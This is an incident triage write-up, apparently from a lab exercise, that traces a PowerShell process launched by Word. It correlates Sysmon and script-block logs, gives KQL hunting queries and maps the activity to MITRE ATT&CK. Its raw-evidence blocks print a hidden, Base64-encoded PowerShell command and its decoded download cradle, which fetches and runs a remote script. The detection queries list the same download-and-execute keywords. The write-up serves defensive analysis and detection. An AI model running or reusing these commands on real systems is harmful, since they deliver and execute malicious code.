# Triage Analysis: Malicious PowerShell Execution & Deobfuscation

## Incident Overview
This report details the triage and correlation of a malicious PowerShell execution. The threat actor attempted to bypass static defences using an encoded payload spawned from a suspicious parent process. By correlating Process Creation logs (Event ID 1) with Script Block Logging (Event ID 4104), the full attack chain and plaintext payload were successfully identified.

---

## Phase 1: Initial Execution (Event ID 1 / Sysmon 1)
The attack was initially detected via process creation monitoring (`DeviceProcessEvents`). A suspicious PowerShell instance was spawned by Microsoft Word, indicating a potential macro-based initial access vector.

### Raw Evidence
```json
{
  "Timestamp": "2026-10-27T08:15:22Z",
  "DeviceName": "WKS-LOGISTICS-04",
  "AccountName": "svc_inventory",
  "InitiatingProcessFileName": "winword.exe",
  "ProcessCommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADAALgAyAC4AMgAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkADQAKAA=="
}
```

### Analysis
The adversary utilised the `-nop` (NoProfile) and `-w hidden` (WindowStyle Hidden) flags for stealth. The `-enc` flag was used to pass a Base64 encoded command, bypassing static command-line inspections. 

### KQL Hunting Query (Process Creation)
To hunt for similar evasion techniques whilst filtering out legitimate background noise (e.g., standard Explorer processes):

```kql
DeviceProcessEvents
| where FileName in~ ("powershell.exe", "pwsh.exe")
| where ProcessCommandLine has_any ("-enc", "-EncodedCommand", "-ep bypass", "-w hidden")
| where InitiatingProcessFileName in~ ("winword.exe", "excel.exe", "cmd.exe", "wscript.exe")
| project Timestamp, DeviceName, InitiatingProcessFileName, ProcessCommandLine
| sort by Timestamp desc
```

---

## Phase 2: Payload Unpacking (Event ID 4104)
To determine the actual intent of the encoded command, the investigation pivoted to PowerShell Script Block Logging. This feature records the plaintext code after the PowerShell engine decodes it in memory, rendering the Base64 obfuscation useless.

### Raw Evidence
```json
{
  "Timestamp": "2026-10-27T08:15:23Z",
  "EventID": 4104,
  "Level": "Warning",
  "Computer": "WKS-LOGISTICS-04",
  "ScriptBlockText": "IEX(New-Object Net.WebClient).DownloadString('http://10.0.2.2/payload.ps1')"
}
```

### Analysis
The decoded script block reveals a classic "Download Cradle". The `IEX` (Invoke-Expression) alias is used in conjunction with `Net.WebClient` to download and execute an external payload directly into memory, leaving minimal traces on the disk.

### KQL Hunting Query (Script Block Logging)
In Microsoft Defender XDR, Script Block events are typically found in the `DeviceEvents` table:

```kql
DeviceEvents
| where ActionType in ("PowerShellCommand", "PowerShellScriptBlock")
| where AdditionalFields has_any ("Net.WebClient", "Invoke-WebRequest", "IEX", "DownloadString")
| project Timestamp, DeviceName, ActionType, AdditionalFields
| sort by Timestamp desc
```

---

## MITRE ATT&CK Mapping
* **Execution**: [T1059.001] Command and Scripting Interpreter: PowerShell
* **Defence Evasion**: [T1140] Deobfuscate/Decode Files or Information
* **Initial Access**: [T1566.001] Phishing: Spearphishing Attachment (implied by `winword.exe` parent process)